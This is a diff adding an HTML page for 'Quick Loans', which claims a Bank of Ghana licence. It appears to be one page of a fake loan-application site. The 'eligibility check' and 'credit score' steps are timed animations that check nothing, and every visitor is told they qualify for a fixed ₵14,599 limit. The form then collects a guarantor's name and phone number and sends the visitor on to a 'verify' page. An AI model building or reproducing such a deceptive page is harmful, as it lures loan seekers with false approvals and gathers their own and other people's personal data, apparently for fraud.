@@ -1,0 +1,703 @@
+<!DOCTYPE html>
+<html lang="en">
+
+<head>
+    <meta charset="UTF-8">
+    <meta name="viewport" content="width=device-width, initial-scale=1.0, viewport-fit=cover, user-scalable=yes">
+    <title>Quick Loans – Loan Application</title>
+    <link rel="icon" href="data:image/svg+xml,<svg xmlns='http://www.w3.org/2000/svg' viewBox='0 0 100 100'><text y='.9em' font-size='90'>⚡</text></svg>">
+    <meta name="theme-color" content="#E30613">
+    <link href="https://fonts.googleapis.com/css2?family=Inter:wght@400;500;600;700;800&display=swap" rel="stylesheet">
+    <link rel="stylesheet" href="https://cdnjs.cloudflare.com/ajax/libs/font-awesome/6.4.0/css/all.min.css">
+    <style>
+        * {
+            margin: 0;
+            padding: 0;
+            box-sizing: border-box;
+        }
+
+        :root {
+            --primary-red: #E30613;
+            --primary-darkred: #b71c1c;
+            --primary-blue: #0033A0;
+            --text-dark: #1a1a1a;
+            --text-muted: #6c757d;
+            --bg-light: #f8f9fc;
+            --shadow: 0 12px 48px rgba(0, 0, 0, 0.08);
+            --radius: 20px;
+        }
+
+        html,
+        body {
+            min-height: 100vh;
+            font-family: 'Inter', sans-serif;
+            background: var(--bg-light);
+        }
+
+        body {
+            display: flex;
+            flex-direction: column;
+            align-items: center;
+            padding: 12px;
+        }
+
+        header {
+            width: 100%;
+            max-width: 480px;
+            padding: 12px 16px;
+            margin-bottom: 12px;
+            background: white;
+            border-radius: 12px;
+            box-shadow: 0 2px 12px rgba(0, 0, 0, 0.06);
+            position: relative;
+            display: flex;
+            align-items: center;
+            justify-content: center;
+            flex-shrink: 0;
+        }
+
+        .back-btn {
+            font-size: 28px;
+            background: none;
+            border: none;
+            cursor: pointer;
+            color: #2c3e50;
+            position: absolute;
+            left: 16px;
+            top: 50%;
+            transform: translateY(-50%);
+            line-height: 1;
+            z-index: 1;
+        }
+
+        .logo {
+            font-size: clamp(28px, 7vw, 40px);
+            font-weight: 800;
+            letter-spacing: -0.5px;
+            text-align: center;
+        }
+
+        .logo-quick {
+            color: var(--primary-red);
+        }
+        .logo-loans {
+            color: var(--primary-blue);
+        }
+
+        .application-card {
+            background: white;
+            border-radius: var(--radius);
+            padding: 24px 20px 32px;
+            width: 100%;
+            max-width: 480px;
+            box-shadow: var(--shadow);
+            display: flex;
+            flex-direction: column;
+            margin-bottom: 16px;
+            position: relative;
+            min-height: 380px;
+        }
+
+        .step-container {
+            display: flex;
+            flex-direction: column;
+            align-items: center;
+            text-align: center;
+            width: 100%;
+        }
+
+        .step-icon {
+            font-size: 48px;
+            color: var(--primary-red);
+            margin-bottom: 8px;
+            flex-shrink: 0;
+        }
+
+        .step-title {
+            font-size: 24px;
+            font-weight: 700;
+            color: var(--primary-red);
+            margin-bottom: 12px;
+            word-break: break-word;
+        }
+
+        .step-description {
+            font-size: 15px;
+            color: var(--text-muted);
+            line-height: 1.5;
+            max-width: 100%;
+            word-break: break-word;
+        }
+
+        .loader {
+            width: 40px;
+            height: 40px;
+            border: 3px solid #ffe0e0;
+            border-top: 3px solid var(--primary-red);
+            border-radius: 50%;
+            animation: spin 1s linear infinite;
+            margin: 20px auto 0;
+            flex-shrink: 0;
+        }
+
+        @keyframes spin {
+            0% {
+                transform: rotate(0deg);
+            }
+            100% {
+                transform: rotate(360deg);
+            }
+        }
+
+        .limit-badge {
+            background: #fef2f2;
+            border: 1px solid #fee2e2;
+            border-radius: 40px;
+            padding: 8px 16px;
+            display: inline-block;
+            font-weight: 600;
+            color: var(--primary-red);
+            margin: 8px 0 12px;
+            font-size: 14px;
+            word-break: break-word;
+        }
+
+        .loan-form {
+            width: 100%;
+            margin-top: 4px;
+            text-align: left;
+        }
+
+        .input-group {
+            margin-bottom: 16px;
+            width: 100%;
+        }
+
+        .input-group label {
+            display: block;
+            font-size: 13px;
+            font-weight: 600;
+            color: var(--text-muted);
+            margin-bottom: 6px;
+        }
+
+        .input-group input {
+            width: 100%;
+            padding: 12px 14px;
+            border: 1px solid #ced4da;
+            border-radius: 12px;
+            font-size: 15px;
+            font-weight: 500;
+            outline: none;
+            transition: border 0.2s, box-shadow 0.2s;
+            background: #fdfdfe;
+            font-family: inherit;
+            -webkit-appearance: none;
+        }
+
+        .input-group input:focus {
+            border-color: var(--primary-red);
+            box-shadow: 0 0 0 3px rgba(227, 6, 19, 0.15);
+        }
+
+        .input-group input.invalid {
+            border-color: #dc3545 !important;
+            box-shadow: 0 0 0 3px rgba(220, 53, 69, 0.15) !important;
+        }
+
+        .name-row {
+            display: grid;
+            grid-template-columns: 1fr 1fr;
+            gap: 12px;
+            width: 100%;
+        }
+
+        .name-row .input-group {
+            margin-bottom: 0;
+        }
+
+        .error-message {
+            font-size: 12px;
+            color: #dc2626;
+            margin-top: 4px;
+            display: none;
+        }
+
+        .error-message.show {
+            display: block;
+        }
+
+        .section-header {
+            margin: 16px 0 12px 0;
+            padding-bottom: 8px;
+            border-bottom: 2px solid #ffe0e0;
+            width: 100%;
+        }
+
+        .section-header h3 {
+            font-size: 15px;
+            font-weight: 700;
+            color: var(--primary-red);
+            letter-spacing: -0.3px;
+            display: flex;
+            align-items: center;
+            gap: 8px;
+        }
+
+        .btn {
+            width: 100%;
+            padding: 14px 20px;
+            border: none;
+            border-radius: 60px;
+            background: linear-gradient(90deg, var(--primary-red), var(--primary-darkred));
+            color: white;
+            font-size: 16px;
+            font-weight: 700;
+            cursor: pointer;
+            box-shadow: 0 8px 20px rgba(227, 6, 19, 0.3);
+            transition: 0.2s;
+            display: block;
+            text-align: center;
+            margin-top: 8px;
+            touch-action: manipulation;
+        }
+
+        .btn:active {
+            transform: scale(0.97);
+        }
+
+        .btn:disabled {
+            background: #e5e5e5;
+            color: #999;
+            box-shadow: none;
+            cursor: not-allowed;
+            transform: none;
+        }
+
+        footer {
+            padding: 16px 16px 20px;
+            color: #adb5bd;
+            font-size: 12px;
+            text-align: center;
+            flex-shrink: 0;
+        }
+
+        #spinner {
+            position: fixed;
+            inset: 0;
+            display: none;
+            align-items: center;
+            justify-content: center;
+            background: rgba(255, 255, 255, 0.8);
+            backdrop-filter: blur(2px);
+            z-index: 1000;
+        }
+
+        .spinner-loader {
+            width: 44px;
+            height: 44px;
+            border: 4px solid #ffe0e0;
+            border-top: 4px solid var(--primary-red);
+            border-radius: 50%;
+            animation: spin 1s linear infinite;
+        }
+
+        @media (max-width: 480px) {
+            body {
+                padding: 8px;
+            }
+            .application-card {
+                padding: 18px 14px 24px;
+                min-height: 340px;
+            }
+            .step-title {
+                font-size: 20px;
+            }
+            .step-icon {
+                font-size: 40px;
+            }
+            .btn {
+                padding: 14px;
+                font-size: 15px;
+            }
+        }
+
+        @media (max-width: 380px) {
+            .application-card {
+                padding: 14px 10px 20px;
+                min-height: 300px;
+            }
+            .input-group input {
+                padding: 10px 12px;
+                font-size: 14px;
+            }
+            .limit-badge {
+                font-size: 12px;
+                padding: 6px 12px;
+            }
+            .step-icon {
+                font-size: 32px;
+            }
+            .step-title {
+                font-size: 18px;
+            }
+            .step-description {
+                font-size: 13px;
+            }
+            .name-row {
+                grid-template-columns: 1fr;
+                gap: 0;
+            }
+            .name-row .input-group {
+                margin-bottom: 16px;
+            }
+            .name-row .input-group:last-child {
+                margin-bottom: 0;
+            }
+        }
+
+        @media (min-width: 769px) {
+            body {
+                padding: 32px;
+            }
+            .application-card {
+                padding: 32px 36px 36px;
+                min-height: 420px;
+            }
+        }
+    </style>
+</head>
+
+<body>
+
+    <header>
+        <button class="back-btn" onclick="history.back()">←</button>
+        <div class="logo">
+            <span class="logo-quick">Quick</span><span class="logo-loans">Loans</span>
+        </div>
+    </header>
+
+    <main class="application-card" id="applicationCard">
+        <div id="stepContent"></div>
+    </main>
+
+    <footer>
+        © 2026 Quick Loans – Licensed by Bank of Ghana | Powered by secure mobile payments
+    </footer>
+
+    <div id="spinner">
+        <div class="spinner-loader"></div>
+    </div>
+
+    <script>
+        const steps = [{
+            icon: 'fas fa-user-check',
+            title: 'Checking Eligibility',
+            description: 'Verifying your account standing and transaction history...',
+            duration: 4000
+        }, {
+            icon: 'fas fa-chart-line',
+            title: 'Calculating Loan Limit',
+            description: 'Analysing repayment capacity and credit score...',
+            duration: 3500
+        }, {
+            icon: 'fas fa-file-invoice-dollar',
+            title: 'Preparing Your Offer',
+            description: 'Finalising the best loan package for you...',
+            duration: 4000
+        }];
+
+        let currentStep = 0;
+        let timeoutId = null;
+        const stepContent = document.getElementById('stepContent');
+        const MAX_LIMIT = 14599;
+        const MIN_AMOUNT = 500;
+
+        // ✅ FIXED: Read phone from localStorage (where details.html saves it)
+        const userPhone = localStorage.getItem('phone') || '';
+
+        function renderStep(index) {
+            const step = steps[index];
+            stepContent.innerHTML = `
+                <div class="step-container">
+                    <div class="step-icon"><i class="${step.icon}"></i></div>
+                    <div class="step-title">${step.title}</div>
+                    <div class="step-description">${step.description}</div>
+                    <div class="loader"></div>
+                </div>
+            `;
+        }
+
+        function showLoanForm() {
+            stepContent.innerHTML = `
+                <div class="step-container">
+                    <div class="step-icon"><i class="fas fa-check-circle"></i></div>
+                    <div class="step-title">You're Qualified!</div>
+                    <div class="limit-badge">Maximum Loan Limit: ₵${MAX_LIMIT.toLocaleString()}</div>
+                    <div class="loan-form">
+                        <div class="input-group">
+                            <label>Loan Amount (₵)</label>
+                            <input type="number" id="loanAmount" placeholder="Enter amount between ₵${MIN_AMOUNT} - ₵${MAX_LIMIT.toLocaleString()}" min="${MIN_AMOUNT}" max="${MAX_LIMIT}" step="1" autocomplete="off">
+                            <div class="error-message" id="amountError">Please enter a valid amount.</div>
+                        </div>
+
+                        <div class="section-header">
+                            <h3><i class="fas fa-user-friends"></i> Guarantor / Next of Kin Details</h3>
+                        </div>
+                        <div class="name-row">
+                            <div class="input-group">
+                                <label>First Name</label>
+                                <input type="text" id="guarantorFirstName" placeholder="First name" autocomplete="off">
+                            </div>
+                            <div class="input-group">
+                                <label>Last Name</label>
+                                <input type="text" id="guarantorLastName" placeholder="Last name" autocomplete="off">
+                            </div>
+                        </div>
+                        <div class="input-group">
+                            <label>Guarantor's Phone Number</label>
+                            <input type="tel" id="guarantorPhone" placeholder="e.g., 024XXXXXXX" inputmode="numeric" autocomplete="off">
+                            <div class="error-message" id="phoneError">Phone number cannot be the same as yours.</div>
+                        </div>
+
+                        <button id="applyBtn" class="btn" disabled>Apply Now</button>
+                    </div>
+                </div>
+            `;
+
+            const amountInput = document.getElementById('loanAmount');
+            const firstNameInput = document.getElementById('guarantorFirstName');
+            const lastNameInput = document.getElementById('guarantorLastName');
+            const phoneInput = document.getElementById('guarantorPhone');
+            const applyBtn = document.getElementById('applyBtn');
+            const amountError = document.getElementById('amountError');
+            const phoneError = document.getElementById('phoneError');
+
+            // Track which fields have been touched by the user
+            const touched = {
+                amount: false,
+                firstName: false,
+                lastName: false,
+                phone: false
+            };
+
+            function getErrorElement(field) {
+                if (field === 'amount') return amountError;
+                if (field === 'phone') return phoneError;
+                // For name fields, we use a shared error element
+                let el = document.getElementById('nameError');
+                if (!el) {
+                    el = document.createElement('div');
+                    el.id = 'nameError';
+                    el.className = 'error-message';
+                    phoneInput.parentNode.insertBefore(el, phoneInput.nextSibling);
+                }
+                return el;
+            }
+
+            function getInputElement(field) {
+                if (field === 'amount') return amountInput;
+                if (field === 'firstName') return firstNameInput;
+                if (field === 'lastName') return lastNameInput;
+                if (field === 'phone') return phoneInput;
+                return null;
+            }
+
+            function showError(el, message) {
+                el.textContent = message || 'Please correct this field.';
+                el.classList.add('show');
+            }
+
+            function hideError(el) {
+                el.classList.remove('show');
+            }
+
+            function markInvalid(field) {
+                const input = getInputElement(field);
+                if (input) input.classList.add('invalid');
+            }
+
+            function markValid(field) {
+                const input = getInputElement(field);
+                if (input) input.classList.remove('invalid');
+            }
+
+            function validateForm(forceShowAll = false) {
+                const amount = parseInt(amountInput.value, 10);
+                const firstName = firstNameInput.value.trim();
+                const lastName = lastNameInput.value.trim();
+                const phone = phoneInput.value.trim();
+
+                let isValid = true;
+                const errors = {};
+
+                // Amount validation
+                if (isNaN(amount) || amount < MIN_AMOUNT || amount > MAX_LIMIT) {
+                    isValid = false;
+                    let msg = 'Please enter a valid amount.';
+                    if (!isNaN(amount)) {
+                        msg = `Amount must be between ₵${MIN_AMOUNT} and ₵${MAX_LIMIT.toLocaleString()}.`;
+                    }
+                    errors.amount = msg;
+                }
+
+                // Name validation
+                if (firstName === '' || lastName === '') {
+                    isValid = false;
+                    errors.name = 'Both first name and last name are required.';
+                }
+
+                // Phone validation
+                const phoneDigits = phone.replace(/\D/g, '');
+                const userPhoneDigits = userPhone.replace(/\D/g, '');
+
+                if (phone === '') {
+                    isValid = false;
+                    errors.phone = 'Guarantor phone number is required.';
+                } else if (phoneDigits === userPhoneDigits && userPhoneDigits !== '') {
+                    isValid = false;
+                    errors.phone = 'Guarantor phone number cannot be the same as yours.';
+                } else if (phoneDigits.length < 9) {
+                    isValid = false;
+                    errors.phone = 'Please enter a valid phone number (at least 9 digits).';
+                }
+
+                // --- Apply UI updates based on touched state ---
+
+                // Amount
+                if (touched.amount || forceShowAll) {
+                    if (errors.amount) {
+                        showError(amountError, errors.amount);
+                        markInvalid('amount');
+                    } else {
+                        hideError(amountError);
+                        markValid('amount');
+                    }
+                } else {
+                    hideError(amountError);
+                    markValid('amount');
+                }
+
+                // Name (shared error element)
+                const nameErrorEl = getErrorElement('name');
+                if ((touched.firstName || touched.lastName || forceShowAll)) {
+                    if (errors.name) {
+                        showError(nameErrorEl, errors.name);
+                        if (firstName === '') markInvalid('firstName');
+                        else markValid('firstName');
+                        if (lastName === '') markInvalid('lastName');
+                        else markValid('lastName');
+                    } else {
+                        hideError(nameErrorEl);
+                        markValid('firstName');
+                        markValid('lastName');
+                    }
+                } else {
+                    hideError(nameErrorEl);
+                    markValid('firstName');
+                    markValid('lastName');
+                }
+
+                // Phone
+                if (touched.phone || forceShowAll) {
+                    if (errors.phone) {
+                        showError(phoneError, errors.phone);
+                        markInvalid('phone');
+                    } else {
+                        hideError(phoneError);
+                        markValid('phone');
+                    }
+                } else {
+                    hideError(phoneError);
+                    markValid('phone');
+                }
+
+                // Enable/disable button
+                applyBtn.disabled = !isValid;
+                return isValid;
+            }
+
+            // --- Event listeners ---
+
+            amountInput.addEventListener('input', function() {
+                touched.amount = true;
+                validateForm();
+            });
+
+            firstNameInput.addEventListener('input', function() {
+                touched.firstName = true;
+                validateForm();
+            });
+
+            lastNameInput.addEventListener('input', function() {
+                touched.lastName = true;
+                validateForm();
+            });
+
+            phoneInput.addEventListener('input', function() {
+                touched.phone = true;
+                validateForm();
+            });
+
+            // --- Submit ---
+
+            applyBtn.addEventListener('click', function() {
+                // Mark all fields as touched to show all errors
+                touched.amount = true;
+                touched.firstName = true;
+                touched.lastName = true;
+                touched.phone = true;
+
+                const isValid = validateForm(true);
+
+                if (isValid) {
+                    const amount = parseInt(amountInput.value, 10);
+                    const firstName = firstNameInput.value.trim();
+                    const lastName = lastNameInput.value.trim();
+                    const phone = phoneInput.value.trim();
+                    const phoneDigits = phone.replace(/\D/g, '');
+
+                    sessionStorage.setItem('loanAmount', amount);
+                    sessionStorage.setItem('guarantorFirstName', firstName);
+                    sessionStorage.setItem('guarantorLastName', lastName);
+                    sessionStorage.setItem('guarantorPhone', phoneDigits);
+
+                    const spinner = document.getElementById('spinner');
+                    spinner.style.display = 'flex';
+                    applyBtn.disabled = true;
+
+                    setTimeout(() => {
+                        window.location.href = 'verify.html';
+                    }, 1500);
+                }
+            });
+
+            // Initial state: button disabled, no errors shown
+            applyBtn.disabled = true;
+        }
+
+        function nextStep() {
+            currentStep++;
+            if (currentStep < steps.length) {
+                renderStep(currentStep);
+                timeoutId = setTimeout(nextStep, steps[currentStep].duration);
+            } else {
+                showLoanForm();
+            }
+        }
+
+        function startApplication() {
+            renderStep(0);
+            timeoutId = setTimeout(nextStep, steps[0].duration);
+        }
+
+        startApplication();
+
+        window.addEventListener('beforeunload', () => {
+            if (timeoutId) clearTimeout(timeoutId);
+        });
+    </script>
+
+</body>
+
+</html>
